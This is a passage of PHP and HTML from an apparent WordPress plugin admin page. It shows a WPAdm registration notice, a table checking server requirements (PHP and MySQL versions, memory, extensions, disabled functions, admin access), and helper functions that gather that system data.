                            <span style="font-weight:bold; font-size: 14px;">If you are NOT registered at WPAdm,</span> enter your email and password to use as your Account Data for authorization on WPAdm. <br /><span style="font-weight: bold;font-size: 14px;">If you already have an account at WPAdm</span> and you want to Sign-In, so please, enter your registered credential data (email and password twice).
                        </div>
                    </form>
                </div>
            </div>  
            <?php } ?>

        <script>
            jQuery(document).ready(function() {
                jQuery('.plugins-icon').click(function() {
                    title = jQuery(this).parent('.plugins-title');
                    box = title.parent('.plugins-box');
                    content = box.find('.plugins-info-content');
                    display = content.css('display');
                    if (display == 'none') {
                        content.show('slow');
                    } else {
                        content.hide('slow');
                    }
                })
            })
            function showRegistartion(show)
            {
                if (show) {
                    jQuery('.cfTabsContainer').show('slow');
                } else {
                    jQuery('.cfTabsContainer').hide('slow');
                }
            }
        </script>

        <div class="clear" style="margin-bottom: 50px;"></div>
        <table class="wp-list-table widefat fixed" >
            <thead>
                <tr>
                    <th></th>
                    <th>Recommended value</th>
                    <th>Your value</th>
                    <th>Status</th>
                </tr>
            </thead>
            <tbody>  
                <tr>
                    <th scope="row">PHP Version</th>
                    <td><?php echo PHP_VERSION_DEFAULT ?> or greater</td>
                    <td><?php echo check_version($phpVersion , PHP_VERSION_DEFAULT) === false ? '<span style="color:#fb8004;font-weight:bold;">' . $phpVersion .'</span>' : $phpVersion ?></td>
                    <td><?php echo (check_version($phpVersion , PHP_VERSION_DEFAULT) ? '<span style="color:green;font-weight:bold;">OK</span>' : '<span style="color:#fb8004;font-weight:bold;">Please update your PHP version to get it working correctly</span>') ?></td>
                </tr>
                <tr>
                    <th scope="row">MySQL Version</th>
                    <td><?php echo MYSQL_VERSION_DEFAULT ?> or greater</td>
                    <td><?php echo check_version($mysqlVersion , MYSQL_VERSION_DEFAULT) === false ? '<span style="color:#fb8004;font-weight:bold;">' . $mysqlVersion .'</span>' : $mysqlVersion; ?></td>
                    <td><?php echo (check_version($mysqlVersion , MYSQL_VERSION_DEFAULT) ? '<span style="color:green;font-weight:bold;">OK</span>' : '<span style="color:#fb8004;font-weight:bold;">Please update your MySQL version to get it working correctly</span>') ?></td>
                </tr>
                <tr>
                    <th scope="row">Max Execution Time</th>
                    <td><?php echo $newMaxExecutionTime ?></td>
                    <td><?php echo ($upMaxExecutionTime == 0) ? '<span style="color:#fb8004;font-weight:bold;">' . $maxExecutionTime .'</span>' : $maxExecutionTime; ?></td>
                    <td><?php echo ($upMaxExecutionTime == 1) ? '<span style="color:green; font-weight:bold;">OK</span>' : '<span style="color:#fb8004;font-weight:bold;">Correct operation of the plugin can not be guaranteed.</span>'; ?></td>
                </tr>
                <tr>
                    <th scope="row">Max Memory Limit</th>
                    <td><?php echo $newMemoryLimit . 'M' ?></td>
                    <td><?php echo ($upMemoryLimit == 0) ? '<span style="color:#fb8004;font-weight:bold;">' . $maxMemoryLimit .'</span>' : $maxMemoryLimit  ?></td>
                    <td><?php echo ($upMemoryLimit == 1) ? '<span style="color:green;font-weight:bold;">OK</span>' : '<span style="color:#fb8004;font-weight:bold;">Correct operation of the plugin can not be guaranteed.</span>'; ?></td>
                </tr>
                <tr>
                    <th scope="row">PHP Extensions</th>
                    <?php $ex = $c['ex']; ?>
                    <td><?php echo ( $ex ) === false ? 'All present' : '<span style="color:#ffba00;font-weight:bold;">' . implode(", ", $ex) . '</span>'; ?></td>
                    <td><?php echo ( $ex ) === false ? 'Found' : '<span style="color:#ffba00;font-weight:bold;">Not Found</span>'; ?></td>
                    <td><?php echo ( $ex ) === false ? '<span style="color:green;font-weight:bold;">Ok</span>' : '<span style="color:#fb8004;font-weight:bold;">Functionality is not guaranteed.</span>'; ?></td>
                </tr>
                <tr>
                    <th scope="row">Disabled Functions</th>
                    <td colspan="3" align="left"><?php echo ( $func = $c['func']) === false ? '<span style="color:green;font-weight:bold;">All necessary functions are enabled</span>' : '<span style="color:#fb8004;font-weight:bold;">Please enable these functions to get plugin working correctly: ' . implode(", ", $func) . '</span>'; ?></td>
                </tr>
                <tr>
                    <th scope="row">Plugin Access</th>
                    <td colspan="3" align="left"><?php echo ( ( is_admin() && is_super_admin() ) ? "<span style=\"color:green; font-weight:bold;\">Granted</span>" : "<span style=\"color:red; font-weight:bold;\">To administrate this Plugin(s) is an 'Admin' right required.</span>")?></td>
                </tr>
            </tbody>
        </table>
        <?php 
        }
    }

    if (! function_exists('check_function')) {
        function check_function($func, $search, $type = false)
        {
            if (is_string($func)) {
                $func = explode(", ", $func);
            }
            if (is_string($search)) {
                $search = explode(", ", $search);
            }
            $res = false;
            $n = count($search);
            for($i = 0; $i < $n; $i++) {
                if (in_array($search[$i], $func) === $type) {
                    $res[] = $search[$i];
                }
            }
            return $res;
        }
    }

    if (! function_exists('check_version')) {
        function check_version($ver, $ver2)
        {
            return version_compare($ver, $ver2, ">");
        }
    }
    if (!function_exists('ltrimslashes')) {
        function ltrimslashes($var)
        {
            return ltrim_arr( utf8_encode( urldecode( $var ) ) );
        }
    }

    if (!function_exists('ltrim_arr')) {
        function ltrim_arr($var)
        {
            return ltrim( str_replace(ABSPATH, '', $var) , '/');
        }
    }
    if (!function_exists("get_system_data")) {
        function get_system_data()
        {

            global $wp_version;

            $phpVersion         = phpversion();
            $maxExecutionTime   = ini_get('max_execution_time');
            $maxMemoryLimit     = ini_get('memory_limit');
            $extensions         = implode(', ', get_loaded_extensions());
            $disabledFunctions  = ini_get('disable_functions');
            $mysqlVersion       = '';
            if (! class_exists('wpdb')) {
                require_once ABSPATH . '/' . WPINC . '/wp-db.php';
            }
            $mysqli = new wpdb( DB_USER, DB_PASSWORD, DB_NAME, DB_HOST );
            $errors = $mysqli->last_error;
            if (empty($errors)) {
                $mysqlVersion = $mysqli->db_version();
            }
            $upMaxExecutionTime = 0;
            $newMaxExecutionTime = intval($maxExecutionTime) + 180;

            @set_time_limit( $newMaxExecutionTime );
            if( ini_get('max_execution_time') == $newMaxExecutionTime ){
                $upMaxExecutionTime = 1;

            }
            $upMemoryLimit = 0;
            $newMemoryLimit = intval($maxMemoryLimit) + 60;
            ini_set('memory_limit', $newMemoryLimit.'M');
            if( ini_get('memory_limit') == $newMemoryLimit ){
                $upMemoryLimit = 1;
            }
            $extensions_search = array('curl', 'json', 'mysqli', 'sockets', 'zip', 'ftp');
            $disabledFunctions_search = array('set_time_limit', 'curl_init', 'fsockopen', 'ftp_connect');

            $ex = check_function($extensions, $extensions_search);
            $func = check_function($disabledFunctions, $disabledFunctions_search, true);

            return array('wp_version' => $wp_version, 'php_verion' => phpversion(), 
            'maxExecutionTime' => $maxExecutionTime, 
            'extensions' => $extensions, 'disabledFunctions' => $disabledFunctions,
            'mysqlVersion' => $mysqlVersion, 'upMaxExecutionTime'  => $upMaxExecutionTime,
            'newMaxExecutionTime' => $newMaxExecutionTime, 'upMemoryLimit' => $upMemoryLimit,
            'newMemoryLimit' => $newMemoryLimit, 'maxMemoryLimit' => $maxMemoryLimit,
            'ex' => $ex, 'func' => $func, 'wp_lang' => get_option('WPLANG'),
            );

        }
    }

?>
